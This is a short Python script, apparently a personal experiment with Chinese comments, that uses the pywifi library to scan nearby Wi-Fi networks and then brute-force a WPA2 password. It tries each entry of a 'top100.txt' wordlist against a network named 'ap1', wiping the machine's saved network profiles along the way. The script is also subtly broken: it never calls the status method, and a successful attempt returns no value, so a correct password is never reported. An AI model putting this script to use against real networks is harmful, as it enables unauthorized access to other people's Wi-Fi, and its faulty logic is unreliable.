# date: 2019/03/21 7:57 PM
# author: fanchuang
# github: https://github.com/buxuele/
# email: baogebuxuele@163.com
"""about:
1. 

"""

import pywifi
import sys
import time
from pywifi import *


# 1. 先判断是否有网卡
def any_wifi():
    '''
    const.IFACE_DISCONNECTED：0没有连接
    const.IFACE_INACTIVE：2没有激活
    const.IFACE_CONNECTED：1连接好了
    '''

    wifi = PyWiFi()
    iface = wifi.interfaces()[0]  # 第一个无线网卡

    print(iface.status())  # wifi status


# if  iface in [const.IFACE_DISCONNECTED, const.IFACE_INACTIVE]:
# 	print('connected!')
# else:
# 	print('no wifi')


# 2. 扫描附近的WiFi, 这个方法是可行的
def all_wifi():
    wifi = PyWiFi()
    iface = wifi.interfaces()[0]

    iface.scan()
    res = iface.scan_results()
    for i in res:
        # 分别是 WiFi的名称，mac地址，信号强度
        print(i.ssid, i.bssid, i.signal)


# 3. 尝试连接wifi,  爆破？？？
def get_wifi(password, wifi_name):
    wifi = PyWiFi()
    iface = wifi.interfaces()[0]

    # print(iface.name())	# 输出自己的无线网卡的名称	wlx488ad2683511
    iface.disconnect()  # 断开网卡连接
    time.sleep(3)

    profile = pywifi.Profile()
    profile.ssid = wifi_name
    profile.auth = const.AUTH_ALG_OPEN  # 网卡的开放
    profile.akm.append(const.AKM_TYPE_WPA2PSK)  # wifi 加密算法
    profile.cipher = const.CIPHER_TYPE_CCMP  # 加密单元
    profile.key = password

    iface.remove_all_network_profiles()  # 清除其他的配置文件
    temp_profile = iface.add_network_profile(profile)  # 加载配置文件

    iface.connect(profile)
    time.sleep(10)
    # is_ok = True

    if iface.status == const.IFACE_CONNECTED:
        print('连接成功')
    # print('正确的密码是： ' + password)
    else:
        print('failed!')
        iface.disconnect()
        time.sleep(1)
        return False


# any_wifi()
# all_wifi()
# get_wifi()

for i in open('top100.txt'):
    print(i.strip())
    if get_wifi(i.strip(), 'ap1'):
        print('正确的密码是： ' + i.strip())
        break



